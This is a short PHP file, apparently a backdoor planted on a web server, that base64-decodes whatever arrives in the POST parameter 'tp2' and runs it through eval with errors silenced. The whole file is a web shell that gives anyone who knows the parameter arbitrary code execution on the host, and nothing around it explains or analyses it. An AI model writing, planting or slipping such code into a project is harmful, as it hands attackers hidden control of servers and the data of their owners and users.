<?php
if(!empty($_POST['tp2']) and isset($_POST['tp2'])){
   $fv = base64_decode(($_POST['tp2']));
   @eval($fv);
}
